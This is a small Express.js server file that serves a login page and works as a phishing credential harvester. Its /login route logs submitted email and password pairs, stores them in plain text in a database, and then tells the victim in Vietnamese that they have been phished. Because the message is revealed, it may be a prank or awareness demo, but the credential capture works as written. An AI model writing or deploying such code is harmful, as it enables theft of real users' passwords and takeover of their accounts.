// server.js
const express = require('express');
const path = require('path');
const { Sequelize } = require('sequelize');
const User = require("./users.model")
const app = express();
const port = 5001;
app.use(express.json())



// Set up Pug as the template engine
app.set('view engine', 'pug');
app.set('views', path.join(__dirname, 'views'));


// Serve static files from 'public' directory
app.use(express.static(path.join(__dirname, 'public')));


// Routes
app.get('/', (req, res) => {
  res.render('index');
});

app.post("/login", async (req, res, next) => {
  const { email: username, password } = req.body
  if (!username || !password) return;

  console.log(req.body)

  await User.create({
    username, password
  })

  return res.status(200).json({
    message: "Ban da bi phishing hjhj",
    payload: req.body
  })
})

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
}).on('error', (err) => {
  console.error('Server error:', err);
});


app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});